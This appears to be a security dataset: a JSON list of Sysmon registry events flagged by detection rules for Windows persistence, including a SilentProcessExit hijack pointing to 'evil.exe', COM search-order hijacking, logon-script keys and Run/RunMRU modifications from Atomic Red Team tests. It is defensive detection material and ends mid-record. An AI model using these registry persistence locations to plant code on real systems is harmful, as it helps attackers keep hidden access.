	{
		"Rule level":"critical",
		"title":"Registry Persistence Mechanisms - BB467BB2",
		"description":"Detects persistence registry keys",
		"row_id":434,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"365ABB72-6F63-5D0A-0000-0010F93A1300",
		"processid":284,
		"utctime":"2019-06-19 17:22:45.678",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":13,
		"eventrecordid":8038,
		"threadid":2076,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-06-19T17:22:45.694013Z",
		"version":2,
		"details":"C:\\windows\\temp\\evil.exe",
		"eventtype":"SetValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\\MonitorProcess",
		"rulename":"Persistence via SilentProcessExit hijack"
	},
	{
		"Rule level":"medium",
		"title":"Windows Registry Persistence COM Search Order Hijacking - 6D9CBBD4",
		"description":"Detects potential COM object hijacking leveraging the COM Search Order",
		"row_id":1994,
		"image":"C:\\Users\\IEUser\\Downloads\\com-hijack.exe",
		"processguid":"365ABB72-47BB-5CE3-0000-0010BFA83E00",
		"processid":3416,
		"utctime":"2019-05-21 00:35:07.375",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":13,
		"eventrecordid":372,
		"threadid":3496,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-05-21T00:35:07.474160Z",
		"version":2,
		"details":"C:\\ProgramData\\demo.dll",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3583694148-1414552638-2922671848-1000_CLASSES\\CLSID\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\InprocServer32\\(Default)"
	},
	{
		"Rule level":"high",
		"title":"Logon Scripts (UserInitMprLogonScript) Registry - F84F3B00",
		"description":"Detects creation or execution of UserInitMprLogonScript persistence method",
		"row_id":4325,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D983-5D31-0000-00102E663900",
		"processid":2796,
		"utctime":"2019-07-19 14:54:01.900",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":13,
		"eventrecordid":4051,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":13,
		"systemtime":"2019-07-19T14:54:01.925833Z",
		"version":2,
		"details":"Binary Data",
		"eventtype":"SetValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Environment\\UserInitMprLogonScript"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3799,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:14.110",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311350,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:00:14.124941Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3800,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:14.173",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311351,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:00:14.195350Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3802,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:17.579",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311353,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:00:17.591085Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3806,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:28.297",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311357,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:00:28.307191Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3807,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:28.423",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311358,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:00:28.458874Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3809,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:31.172",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311360,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:00:31.217996Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3812,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:42.907",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311363,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:00:42.919208Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3813,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:43.016",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311364,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:00:43.042849Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3815,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:00:45.579",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311366,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:00:45.590448Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3820,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:01:01.142",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311371,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:01:01.154382Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3821,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:01:01.314",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311372,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:01:01.337406Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3823,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-86FC-5F07-0000-00101E4B0700",
		"processid":3280,
		"utctime":"2020-07-09 22:01:03.893",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311374,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:01:03.899240Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3827,
		"image":"C:\\Windows\\system32\\mmc.exe",
		"processguid":"747F3D96-911A-5F07-0000-001087C73500",
		"processid":3280,
		"utctime":"2020-07-09 22:02:42.078",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311378,
		"threadid":1044,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:02:42.085643Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3830,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-94CF-5F07-0000-0010BD590400",
		"processid":3148,
		"utctime":"2020-07-09 22:06:14.101",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311384,
		"threadid":4088,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:06:14.112018Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3831,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-94CF-5F07-0000-0010BD590400",
		"processid":3148,
		"utctime":"2020-07-09 22:06:14.212",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311385,
		"threadid":4088,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:06:14.229482Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3832,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-94CF-5F07-0000-0010BD590400",
		"processid":3148,
		"utctime":"2020-07-09 22:06:20.180",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311386,
		"threadid":4088,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:06:20.184983Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3835,
		"image":"C:\\Windows\\system32\\mmc.exe",
		"processguid":"747F3D96-94DC-5F07-0000-00102FB00700",
		"processid":3148,
		"utctime":"2020-07-09 22:07:33.789",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311389,
		"threadid":4088,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-09T22:07:33.800208Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3872,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D765-5D31-0000-001022C02800",
		"processid":2796,
		"utctime":"2019-07-19 14:44:53.354",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":3598,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2019-07-19T14:44:53.371305Z",
		"version":2,
		"eventtype":"DeleteValue",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Atomic Red Team",
		"rulename":"Persistence - via Run key"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3879,
		"image":"C:\\Windows\\system32\\reg.exe",
		"processguid":"747F3D96-D772-5D31-0000-001083ED2800",
		"processid":2796,
		"utctime":"2019-07-19 14:45:06.231",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":3605,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2019-07-19T14:45:06.240380Z",
		"version":2,
		"eventtype":"DeleteValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend\\1",
		"rulename":"Persistence - via Run key"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":3882,
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"processguid":"747F3D96-D6F7-5D31-0000-00104ACE2500",
		"processid":2796,
		"utctime":"2019-07-19 14:45:24.197",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":3608,
		"threadid":3592,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2019-07-19T14:45:24.234606Z",
		"version":2,
		"eventtype":"DeleteValue",
		"targetobject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun",
		"rulename":"Persistence - via Run key"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":4458,
		"image":"C:\\Windows\\system32\\mmc.exe",
		"processguid":"747F3D96-F053-6081-0000-0010A90E1D00",
		"processid":3352,
		"utctime":"2021-04-22 22:09:35.159",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":564603,
		"threadid":4696,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2021-04-22T22:09:35.165933Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":6685,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-94CF-5F07-0000-0010BD590400",
		"processid":3148,
		"utctime":"2020-07-10 10:20:35.880",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311398,
		"threadid":4088,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-10T10:20:35.886994Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":6686,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-94CF-5F07-0000-0010BD590400",
		"processid":3148,
		"utctime":"2020-07-10 10:20:35.898",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311399,
		"threadid":4088,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-10T10:20:35.913133Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":6688,
		"image":"C:\\Windows\\Explorer.EXE",
		"processguid":"747F3D96-94CF-5F07-0000-0010BD590400",
		"processid":3148,
		"utctime":"2020-07-10 10:20:37.668",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311412,
		"threadid":4088,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-10T10:20:37.672471Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":6691,
		"image":"C:\\Windows\\system32\\mmc.exe",
		"processguid":"747F3D96-94DC-5F07-0000-00102FB00700",
		"processid":3148,
		"utctime":"2020-07-10 10:20:58.942",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":311423,
		"threadid":4088,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-10T10:20:58.942506Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":7180,
		"image":"C:\\Windows\\system32\\svchost.exe",
		"processguid":"747F3D96-BB00-5FCA-0000-001033CD7600",
		"processid":3560,
		"utctime":"2020-12-04 22:41:04.541",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":549017,
		"threadid":4600,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-12-04T22:41:04.542909Z",
		"version":2,
		"eventtype":"CreateKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":7185,
		"image":"C:\\Windows\\regedit.exe",
		"processguid":"747F3D96-3D4D-5F06-0000-00104CB13B00",
		"processid":2268,
		"utctime":"2020-07-08 21:41:52.432",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":308049,
		"threadid":3800,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":12,
		"systemtime":"2020-07-08T21:41:52.449709Z",
		"version":2,
		"eventtype":"DeleteKey",
		"targetobject":"HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	},
	{
		"Rule level":"medium",
		"title":"Autorun Keys Modification - F2F929C8",
		"description":"Detects modification of autostart extensibility point (ASEP) in registry.",
		"row_id":7186,
		"image":"C:\\Windows\\system32\\mmc.exe",
		"processguid":"747F3D96-3AAD-5F06-0000-001004942C00",
		"processid":2268,
		"utctime":"2020-07-08 21:42:01.646",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":12,
		"eventrecordid":308050,
